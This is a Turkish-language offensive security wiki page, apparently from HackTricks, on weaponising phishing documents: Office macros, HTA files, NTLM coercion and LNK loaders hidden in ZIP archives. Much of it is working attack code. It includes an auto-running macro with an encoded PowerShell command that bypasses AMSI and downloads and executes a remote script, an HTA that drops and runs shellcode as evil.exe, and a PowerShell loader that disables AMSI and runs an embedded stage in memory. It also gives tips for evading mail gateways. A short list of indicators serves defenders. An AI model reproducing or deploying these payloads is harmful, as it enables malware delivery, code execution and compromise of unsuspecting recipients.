# Phishing Dosyalar & Belgeler

{{#include ../../banners/hacktricks-training.md}}

## Office Belgeleri

Microsoft Word, bir dosyayı açmadan önce dosya veri doğrulaması yapar. Veri doğrulaması, OfficeOpenXML standardına göre veri yapısı tanımlaması şeklinde gerçekleştirilir. Veri yapısı tanımlaması sırasında herhangi bir hata oluşursa, incelenen dosya açılmaz.

Genellikle makro içeren Word dosyaları `.docm` uzantısını kullanır. Ancak dosya uzantısını değiştirerek dosyayı yeniden adlandırmak ve makro çalıştırma yeteneklerini korumak mümkündür.\
Örneğin, RTF formatı tasarım gereği makro desteği sağlamaz, ancak bir `.docm` dosyası RTF olarak yeniden adlandırılırsa Microsoft Word tarafından işlenecek ve makro çalıştırma yeteneğine sahip olacaktır.\
Aynı iç yapılar ve mekanizmalar Microsoft Office Suite içindeki tüm yazılımlar için geçerlidir (Excel, PowerPoint vb.).

Bazı Office programları tarafından hangi uzantıların çalıştırılacağını kontrol etmek için aşağıdaki komutu kullanabilirsiniz:
```bash
assoc | findstr /i "word excel powerp"
```
DOCX dosyaları, makrolar içeren uzak bir şablona referans veriyorsa (File –Options –Add-ins –Manage: Templates –Go) makroları da “çalıştırabilir”.

### Harici Resim Yükleme

Şuraya gidin: _Insert --> Quick Parts --> Field_\
_**Kategoriler**: Links and References, **Alan adları**: includePicture, ve **Dosya adı veya URL**:_ http://<ip>/whatever

![](<../../images/image (155).png>)

### Macros Backdoor

Belgeden macros kullanarak rastgele kod çalıştırmak mümkündür.

#### Autoload functions

Ne kadar yaygınlarsa, AV'nin onları tespit etme olasılığı o kadar yüksek olur.

- AutoOpen()
- Document_Open()

#### Macros Code Examples
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### Meta verilerini elle kaldırma

Şu menüye gidin: **File > Info > Inspect Document > Inspect Document**, bu işlem Document Inspector'ı açacaktır. **Inspect**'e tıklayın ve ardından **Document Properties and Personal Information** yanında **Remove All**'a tıklayın.

#### Belge uzantısı

İşlem bittikten sonra **Save as type** açılır menüsünden formatı **`.docx`**'ten **Word 97-2003 `.doc`**'a değiştirin.\
Bunu yapın çünkü **`.docx` içine makro kaydedemezsiniz** ve makro etkin **`.docm`** uzantısı etrafında bir **stigma** vardır (ör. küçük resim simgesinde büyük bir `!` bulunur ve bazı web/e-posta geçitleri bunları tamamen engeller). Bu nedenle bu **eski `.doc` uzantısı en iyi uzlaşıdır**.

#### Malicious Macros Generators

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## HTA Files

HTA, HTML ve betik dillerini (ör. **VBScript** ve **JScript**) birleştiren bir Windows programıdır. Kullanıcı arayüzünü oluşturur ve tarayıcının güvenlik modelinin kısıtlamaları olmadan "tam yetkili" bir uygulama olarak çalışır.

HTA, **`mshta.exe`** kullanılarak çalıştırılır; bu genellikle **Internet Explorer** ile birlikte **yüklü** gelir, bu da **`mshta`'nın IE'ye bağımlı olmasına** neden olur. Dolayısıyla Internet Explorer kaldırıldıysa, HTA'lar çalıştırılamaz.
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## NTLM Kimlik Doğrulamasını Zorlama

NTLM kimlik doğrulamasını **"uzaktan" zorlamak** için birkaç yol vardır; örneğin, kullanıcının erişeceği e-postalara veya HTML'e **görünmez resimler** ekleyebilirsiniz (hatta HTTP MitM?). Veya kurbana **dosyaların adresini** göndererek, yalnızca **klasörü açmak** ile bir **kimlik doğrulamasını** **tetikleyebilirsiniz**.

**Bu fikirleri ve daha fazlasını aşağıdaki sayfalarda inceleyin:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

Hash'i veya kimlik doğrulamayı çalmanın yanı sıra **NTLM relay attacks** de gerçekleştirebileceğinizi unutmayın:

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-Embedded Payloads (fileless chain)

Son derece etkili kampanyalar, iki meşru alıcı belge (PDF/DOCX) ve kötü amaçlı bir .lnk içeren bir ZIP gönderir. Hile şu ki, gerçek PowerShell loader ZIP’in ham baytları içinde benzersiz bir marker’den sonra saklanır ve .lnk bunu ayırıp tamamen bellekte çalıştırır.

.lnk PowerShell one-liner tarafından uygulanan tipik akış:

1) Orijinal ZIP'i şu yaygın yolları kontrol ederek bulun: Desktop, Downloads, Documents, %TEMP%, %ProgramData% ve mevcut çalışma dizininin üst dizini.
2) ZIP baytlarını okuyun ve sabit kodlu bir marker bulun (örn., xFIQCV). Marker'den sonraki her şey gömülü PowerShell payload'udur.
3) ZIP'i %ProgramData% içine kopyalayın, orada açın ve meşru görünmesi için sahte .docx'i açın.
4) Mevcut süreç için AMSI'yi atlayın: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) Bir sonraki aşamanın obfuskasyonunu kaldırın (örn., tüm # karakterlerini silin) ve bunu bellekte çalıştırın.

Gömülü aşamayı ayıklayıp çalıştırmak için örnek PowerShell iskeleti:
```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
"$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
"$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```
Notlar
- Teslimat genellikle saygın PaaS alt alan adlarını (ör., *.herokuapp.com) kötüye kullanır ve payloads'ı gate'leyebilir (IP/UA bazlı zararsız ZIP'ler sunar).
- Bir sonraki aşama sık sık base64/XOR shellcode'u çözer ve disk artefaktlarını en aza indirmek için Reflection.Emit + VirtualAlloc ile çalıştırır.

Aynı zincirde kullanılan Persistence
- COM TypeLib hijacking, Microsoft Web Browser control üzerinde, IE/Explorer veya içine gömülü herhangi bir uygulamanın payload'u otomatik olarak yeniden başlatması için kullanılır. Detaylar ve kullanıma hazır komutlar için buraya bakın:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Hunting/IOCs
- Arşiv verisine eklenmiş ASCII işaretleyici dizisi (ör., xFIQCV) içeren ZIP dosyaları.
- ZIP'i bulmak için üst/kullanıcı klasörlerini listeleyen ve bir decoy document açan .lnk.
- AMSI tampering via [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- Güvenilir PaaS domainleri altında barındırılan linklerle sona eren uzun süreli iş dizileri.

## Referanslar

- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)

{{#include ../../banners/hacktricks-training.md}}
